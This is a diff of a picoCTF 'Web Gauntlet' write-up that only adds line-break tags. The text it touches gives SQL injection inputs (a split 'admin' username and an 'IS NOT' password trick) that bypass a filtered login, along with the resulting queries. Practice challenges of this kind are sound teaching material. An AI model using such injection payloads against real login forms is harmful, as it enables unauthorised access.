@@ -86,7 +86,7 @@ Afterwards, you can just run the following command to sign your own cookie that 
 
 **Challenge Link**
 
-http://mercury.picoctf.net:35178/ - Web Gauntlet 2
+http://mercury.picoctf.net:35178/ - Web Gauntlet 2<br />
 http://mercury.picoctf.net:32946/ - Web Gauntlet 3
 
 <br />
@@ -114,17 +114,17 @@ Next, we need to find a way to bypass the password checking.  We see that they h
 
 We can also use `is` and `is not` to replace `=` and `!=`.
 
-From this I created the inputs:
-Username: `adm'||'in`
-Password: `' | '' IS '`
-Which would query: `SELECT username, password FROM users WHERE username='adm'||'in' AND password='' | '' IS ''`
+From this I created the inputs:<br />
+Username: `adm'||'in`<br />
+Password: `' | '' IS '`<br />
+Which would query: `SELECT username, password FROM users WHERE username='adm'||'in' AND password='' | '' IS ''`<br />
 
 However for some reason this didn't seem to work.  I opened up an online sqlite compiler at `https://sqliteonline.com/` to do some more testing, and found that for some reason the | operator would return true if I put `'' IS NOT ''`.  So I replaced `IS` with `IS NOT` in the query, and it worked!
 
-Final Input:
-Username: `adm'||'in`
-Password: `' | '' IS NOT '`
-Which would query: `SELECT username, password FROM users WHERE username='adm'||'in' AND password='' | '' IS NOT ''`
+Final Input:<br />
+Username: `adm'||'in`<br />
+Password: `' | '' IS NOT '`<br />
+Which would query: `SELECT username, password FROM users WHERE username='adm'||'in' AND password='' | '' IS NOT ''`<br />
 
 Which happens to be exactly 25 characters long.
 Navigate to filter.php to find the flag afterwards.
